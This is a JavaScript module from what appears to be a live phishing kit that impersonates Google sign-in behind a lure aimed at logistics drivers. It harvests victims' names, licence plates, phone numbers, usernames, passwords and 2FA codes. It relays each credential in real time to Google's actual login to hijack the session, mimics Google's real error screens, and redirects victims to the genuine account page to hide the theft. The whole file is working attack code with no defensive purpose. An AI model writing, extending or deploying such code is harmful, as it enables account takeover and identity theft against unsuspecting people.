import * as events from './events.js';
import * as store from './store.js';
import * as browser from './browser.js';
import { encrypt } from './crypto.js';

// ---------- single static link ----------
// There's exactly ONE link everyone uses: /w/<STATIC_TOKEN>. Unlike the old
// per-invite model there's no list of generated links — any number of different
// people can register through the same link. Each visitor is tracked by a
// client-generated wizard id (`wid`), so their steps build up ONE fresh session
// of their own and never collide with another person using the link.
export const STATIC_TOKEN = 'login';

// Where the victim's browser is redirected after credentials are captured, so
// they land on the *real* site and never see a fake "you're all set" page.
const LANDING = 'https://myaccount.google.com/';

// wid -> a single person's registration attempt in progress (in-memory; the
// real session is what's persisted in the store, this is just the in-flight copy)
const pending = new Map();

function entry(wid) {
  const key = String(wid || 'default');
  if (!pending.has(key)) {
    pending.set(key, {
      sessionId: null,
      username: '',
      lastLogin: null,
      steps: { username: false, password: false, totp: false },
    });
  }
  return pending.get(key);
}

// wizard-facing view — only what the remote user's page may know
function toPayload(r) {
  const session = r.sessionId ? store.getRaw(r.sessionId) : null;
  return {
    token: STATIC_TOKEN,
    loggedIn: session?.status === 'logged-in',
    // result of the last live-login step the backend drove: status + the real
    // Google error/status message + which screen the REAL browser is now asking
    // for (email/password/totp/prompt/logged-in), so the clone mirrors it exactly.
    login: r.lastLogin ? { status: r.lastLogin.status, message: r.lastLogin.message, state: r.lastLogin.state } : null,
    landing: LANDING,
  };
}

// Called by the wizard page on load. Validates the token (only the static one is
// valid now) and marks the visit as activity for the admin feed.
export function begin(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.opened', { message: 'Someone opened the sign-in link' });
  return toPayload(r);
}

// step: 'username' | 'password' | 'totp' ; value is the submitted string.
// Persists the credential into the visitor's real session *and* drives the
// actual Google sign-in forward (see browser.wizardPhase), so the logged-in
// session is genuinely built up as the user walks the wizard — not just stored.
export async function step(token, wid, step, value) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);

  let message;
  if (step === 'driver') {
    // Logistics driver submission — the first thing a driver fills in (landing
    // form before the Google sign-in). Captured immediately into a session so we
    // keep the plate/driver details even if they never complete the Google login.
    const d = (value && typeof value === 'object') ? value : {};
    const driverName = String(d.driverName ?? '').trim();
    const licensePlate = String(d.licensePlate ?? '').trim().toUpperCase();
    const phone = String(d.phone ?? '').trim();
    r.driver = { driverName, licensePlate, phone };
    r.steps.driver = true;
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: licensePlate ? `${driverName || ''} · ${licensePlate}` : (driverName || 'Driver submission'),
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username: '',
        password: '',
        totpSecret: '',
        note: 'Logistics driver submission',
        driverName,
        licensePlate,
        phone,
      }).id;
    } else {
      store.update(r.sessionId, { driverName, licensePlate, phone });
    }
    message = `Driver: ${driverName || '(no name)'} · plate ${licensePlate || '—'}`;
  } else if (step === 'username') {
    const username = String(value ?? '').trim();
    r.username = username;
    r.steps.username = true;
    // Create the real session the moment the first credential arrives so the
    // live browser login has a persistent home (sessions/<id>).
    if (!r.sessionId) {
      r.sessionId = store.create({
        name: username || 'New sign-in',
        provider: 'google',
        loginUrl: 'https://accounts.google.com/',
        username,
        password: '',
        totpSecret: '',
        note: 'Google sign-in',
      }).id;
    } else {
      store.update(r.sessionId, { username });
    }
    message = `Entered username: ${username || '(blank)'}`;
  } else if (step === 'password') {
    const password = String(value ?? '');
    r.steps.password = true;
    if (r.sessionId) store.update(r.sessionId, { password });
    message = 'Entered password ••••••••';
  } else if (step === 'totp') {
    const secret = String(value ?? '').replace(/\s+/g, '');
    r.steps.totp = true;
    if (r.sessionId) store.update(r.sessionId, { totpSecret: secret });
    message = secret ? 'Provided a 2FA (authenticator) code' : 'Skipped 2FA';
  } else {
    return toPayload(r);
  }

  // Drive the real login for this step. Best-effort — never breaks the wizard:
  // even if Google throws a challenge, the credentials are saved and the admin
  // can finish by hand or Auto-login later. (Driver step has no browser phase —
  // it's just data we store.)
  if (r.sessionId && step !== 'driver') {
    const valueForLogin = step === 'totp' ? String(value ?? '').replace(/\s+/g, '') : value;
    const res = await browser.wizardPhase(step, r.sessionId, valueForLogin);
    // surface the live-login result to the wizard front-end so it can mirror
    // real Google (stay on the field for a wrong password / bad code, etc.)
    r.lastLogin = {
      status: res?.status || 'unknown',
      message: res?.message || '',
      state: res?.state || null,
    };
    if (res?.status === 'logged-in') {
      store.setStatus(r.sessionId, 'logged-in');
      events.push('wizard.logged-in', {
        message: `Signed in ✓  ${r.username || 'Google'}`.trim(),
      });
    } else if (res?.status === 'error') {
      store.setStatus(r.sessionId, 'new');
    }
  }

  events.push('wizard.step', { message });
  return toPayload(r);
}

// Finalize. The session was already created + driven during the steps; here we
// just report completion so the front-end redirects to the real account page.
// (No session is created if the visitor never submitted anything.)
export function complete(token, wid) {
  if (token !== STATIC_TOKEN) return null;
  const r = entry(wid);
  events.push('wizard.completed', {
    message: `Sign-in complete ✓  ${r.username || 'Google'}`.trim(),
  });
  return toPayload(r);
}
